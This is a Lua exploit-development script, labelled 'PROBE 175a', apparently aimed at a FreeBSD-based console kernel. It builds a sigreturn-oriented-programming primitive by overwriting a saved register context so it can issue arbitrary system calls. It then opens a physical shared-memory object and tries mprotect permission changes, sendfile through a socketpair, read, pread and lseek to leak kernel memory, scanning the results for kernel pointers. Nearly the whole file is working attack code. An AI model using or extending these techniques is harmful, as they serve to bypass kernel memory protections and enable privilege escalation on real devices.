-- CRASH_CLASS: MODERATE
-- PROBE 175a: physhm sendfile + mprotect bypass attempts
--
-- 174a: copyin returns EFAULT for physhm VAs. Two more angles:
-- 1. sendfile(physhm_fd, socket) — kernel reads from fd object, not copyin
-- 2. mprotect(physhm_va, PROT_READ) — change PTE from supervisor to user

print("=== PROBE 175a: PHYSHM SENDFILE+MPROTECT ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex64(val)
    local h, l = get_hi_lo(val)
    return string.format("0x%X%08X", h, l)
end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function wq(a,v) memory.write_qword(a,v) end
local function wd(a,v) memory.write_dword(a,v) end
local function rd(a) return to_num(memory.read_dword(a)) end
local function rq(a) return memory.read_qword(a) end

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x100000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end

-- Open physhm
local rv = srop(629, uint64(1), uint64(2), uint64(0), uint64(0))
local fd = rv and to_num(rv) or -1
print("physhm_fd=" .. fd)
if fd < 0 then print("FAILED") print("=== DONE ===") return end

-- mmap physhm
rv = srop(477, uint64(0), uint64(0x4000), uint64(3), uint64(1), uint64(fd), uint64(0))
local mm_h, mm_l = 0, 0
if rv then mm_h, mm_l = get_hi_lo(rv) end
print("physhm_va=" .. hex64(rv))
local physhm_va = uint64(string.format("0x%X%08X", mm_h, mm_l))

-- [A] MPROTECT: try to change physhm pages to user-accessible
print("")
print("--- [A] MPROTECT ---")
-- mprotect(addr, len, prot) = sys 74
local prot_tests = {
    {1, "PROT_READ"},
    {3, "PROT_READ|PROT_WRITE"},
    {5, "PROT_READ|PROT_EXEC"},
    {7, "PROT_RWX"},
}
for _, pt in ipairs(prot_tests) do
    rv = srop(74, physhm_va, uint64(0x4000), uint64(pt[1]))
    local ret = rv and to_num(rv) or -999
    print("  mprotect(" .. pt[2] .. ")=" .. ret)
    if ret == 0 then
        -- Try reading!
        local ok, val = pcall(function() return memory.read_dword(mm_l) end)
        if ok then
            print("  >>> USER READ AFTER MPROTECT: " .. hex64(val) .. " <<<")
        else
            -- Try with full address
            ok, val = pcall(function()
                return memory.read_qword(gpu + 0)  -- dummy, can't pass physhm to memory.read
            end)
            print("  user read still faults")
        end
    end
end

-- [B] SENDFILE from physhm fd
print("")
print("--- [B] SENDFILE ---")
-- Create socketpair
local SP = 0x50000
rv = srop(135, uint64(1), uint64(1), uint64(0), ga(SP))
local sp_ret = rv and to_num(rv) or -1
print("socketpair=" .. sp_ret)

if sp_ret == 0 then
    local sp0 = rd(gpu + SP)
    local sp1 = rd(gpu + SP + 4)
    print("  fds: " .. sp0 .. ", " .. sp1)

    -- sendfile(fd, s, offset, nbytes, hdtr, sbytes, flags)
    -- FreeBSD: sys 393
    local SB = 0x50100  -- sbytes output
    wq(gpu + SB, uint64(0))

    rv = srop(393, uint64(fd), uint64(sp1), uint64(0), uint64(0x100),
        uint64(0), ga(SB), uint64(0))
    local sf = rv and to_num(rv) or -999
    print("  sendfile(physhm_fd, sock, 0, 256)=" .. sf)

    if sf == 0 then
        local sent = to_num(rq(gpu + SB))
        print("  sbytes=" .. sent)

        if sent > 0 then
            -- Read from socket
            local rd_rv = srop(3, uint64(sp0), ga(0x60000), uint64(math.min(sent, 4096)))
            local got = rd_rv and to_num(rd_rv) or -1
            print("  recv=" .. got)
            if got > 0 then
                print("  >>> SENDFILE DATA <<<")
                for row = 0, math.min(7, math.floor((got-1)/16)) do
                    local line = string.format("  +%03X:", row * 16)
                    for i = 0, 15 do
                        local off = row * 16 + i
                        if off < got then
                            local b = math.floor(rd(gpu + 0x60000 + (off - off%4)) / (256 ^ (off%4))) % 256
                            line = line .. string.format(" %02X", b)
                        end
                    end
                    print(line)
                end
                -- Check for kernel pointers
                for off = 0, got - 8, 8 do
                    local qv = rq(gpu + 0x60000 + off)
                    local qh, ql2 = get_hi_lo(qv)
                    if qh >= 0xFFFF8000 and qh < 0xFFFFFFFF then
                        print("  *** KPTR +" .. string.format("%04X", off) .. "=" .. hex64(qv))
                    end
                end
            end
        end
    end

    srop(6, uint64(sp0))
    srop(6, uint64(sp1))
end

-- [C] READ from physhm fd
print("")
print("--- [C] READ FROM FD ---")
rv = srop(3, uint64(fd), ga(0x70000), uint64(0x100))
local rd_ret = rv and to_num(rv) or -999
print("read(physhm_fd)=" .. rd_ret)
if rd_ret > 0 then
    print("  >>> READ DATA <<<")
    for i = 0, math.min(rd_ret - 1, 31) do
        local b = math.floor(rd(gpu + 0x70000 + (i - i%4)) / (256 ^ (i%4))) % 256
        if i % 16 == 0 then io.write(string.format("  +%03X:", i)) end
        io.write(string.format(" %02X", b))
        if i % 16 == 15 or i == math.min(rd_ret - 1, 31) then print("") end
    end
end

-- [D] PREAD from physhm fd at various offsets
print("")
print("--- [D] PREAD ---")
for _, off in ipairs({0, 0x1000, 0x4000, 0x10000}) do
    rv = srop(475, uint64(fd), ga(0x70000), uint64(0x10), uint64(off))
    local pr = rv and to_num(rv) or -999
    if pr > 0 then
        print(string.format("  pread(off=0x%X)=%d data=%s", off, pr, hex64(rq(gpu + 0x70000))))
    else
        print(string.format("  pread(off=0x%X)=%d", off, pr))
    end
end

-- [E] LSEEK + READ
print("")
print("--- [E] LSEEK+READ ---")
-- lseek(fd, 0, SEEK_SET) = sys 478
rv = srop(478, uint64(fd), uint64(0), uint64(0))
print("lseek(0,SET)=" .. (rv and to_num(rv) or -999))
rv = srop(3, uint64(fd), ga(0x70000), uint64(0x10))
print("read after lseek=" .. (rv and to_num(rv) or -999))

-- Cleanup
srop(6, uint64(fd))
print("")
print("pid_post=" .. to_num(make_syscall(20)()))
print("=== DONE ===")
